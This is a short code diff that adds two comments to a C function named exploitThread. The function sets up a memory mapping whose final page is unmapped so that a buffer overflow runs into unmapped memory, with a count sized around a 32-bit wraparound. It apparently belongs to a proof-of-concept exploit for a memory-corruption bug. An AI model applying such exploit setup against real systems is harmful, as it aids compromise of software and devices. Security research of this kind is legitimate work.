@@ -101,8 +101,11 @@ void *exploitThread(void *none) {
 	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
 	
 	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	
+	// Ensure end of mapping is unmapped
 	munmap(mapping + mappingSize, PAGE_SIZE);
 	
+	// buffer + bufferSize + overflowSize points to unmapped memory
 	uint8_t *buffer = mapping + mappingSize - copySize;
 	
 	int64_t count = (0x100000000 + bufferSize) / 4;
